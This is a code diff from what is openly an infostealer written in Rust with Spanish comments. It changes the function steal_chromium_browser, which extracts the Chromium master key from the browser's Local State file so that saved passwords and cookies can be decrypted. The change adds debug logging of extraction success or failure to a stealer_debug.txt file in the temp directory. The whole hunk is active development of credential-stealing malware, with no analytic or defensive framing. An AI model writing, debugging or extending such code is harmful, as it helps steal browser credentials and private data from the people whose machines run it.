@@ -55,7 +55,41 @@ fn steal_chromium_browser(browser_name: &str, relative_path: &str) -> StealerRes
 
     // Leer y parsear Local State para obtener la master key
     let master_key = if file_exists(&local_state_path) {
-        extract_master_key(&local_state_path)?
+        match extract_master_key(&local_state_path) {
+            Ok(Some(key)) => {
+                // DEBUG: Escribir a archivo que la key se extrajo
+                if let Ok(mut f) = std::fs::OpenOptions::new()
+                    .create(true)
+                    .append(true)
+                    .open(std::env::temp_dir().join("stealer_debug.txt")) {
+                    use std::io::Write;
+                    let _ = writeln!(f, "[{}] Master key extracted: {} bytes", browser_name, key.len());
+                }
+                Some(key)
+            },
+            Ok(None) => {
+                // DEBUG: Key no encontrada
+                if let Ok(mut f) = std::fs::OpenOptions::new()
+                    .create(true)
+                    .append(true)
+                    .open(std::env::temp_dir().join("stealer_debug.txt")) {
+                    use std::io::Write;
+                    let _ = writeln!(f, "[{}] Master key NOT found in Local State", browser_name);
+                }
+                None
+            },
+            Err(e) => {
+                // DEBUG: Error extrayendo key
+                if let Ok(mut f) = std::fs::OpenOptions::new()
+                    .create(true)
+                    .append(true)
+                    .open(std::env::temp_dir().join("stealer_debug.txt")) {
+                    use std::io::Write;
+                    let _ = writeln!(f, "[{}] Master key extraction ERROR: {:?}", browser_name, e);
+                }
+                None
+            }
+        }
     } else {
         None
     };
